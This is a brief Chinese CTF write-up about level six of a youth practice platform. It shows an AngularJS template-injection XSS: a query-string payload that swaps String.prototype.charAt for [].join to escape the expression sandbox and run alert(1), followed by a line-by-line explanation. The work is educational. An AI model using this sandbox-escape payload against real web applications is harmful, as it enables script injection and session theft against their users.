### Angular JS 模板注入 XSS

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/68184d6958cb8da5c8dcab87.png)

**第六关**

测试发现存在模板注入漏洞

![](https://pic1.imgdb.cn/item/68184d8d58cb8da5c8dcab96.png)

构造 payload，[参考文章](https://juejin.cn/post/6891628594725847047#heading-4)

```
?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

`'a'.constructor.prototype.charAt=[].join`

- `'a'.constructor` 获取字符串的构造函数（String）
- `prototype.charAt` 访问 String 原型上的 charAt 方法
- 将 charAt 方法替换为数组的 join 方法

`$eval('x=1} } };alert(1)//')`

- `$eval` 是 AngularJS 的一个方法，用于执行字符串形式的表达式
- 注入的代码 `x=1} } };alert(1)//` 包含：
  - `x=1` - 一个简单的赋值，部分目的是为了闭合前面的语法
  - `} } }` - 多个闭合括号，用于逃逸 AngularJS 的模板解析
  - `;alert(1)` - 实际要执行的恶意代码
  - `//` - JavaScript 注释，用于注释掉后续可能存在的代码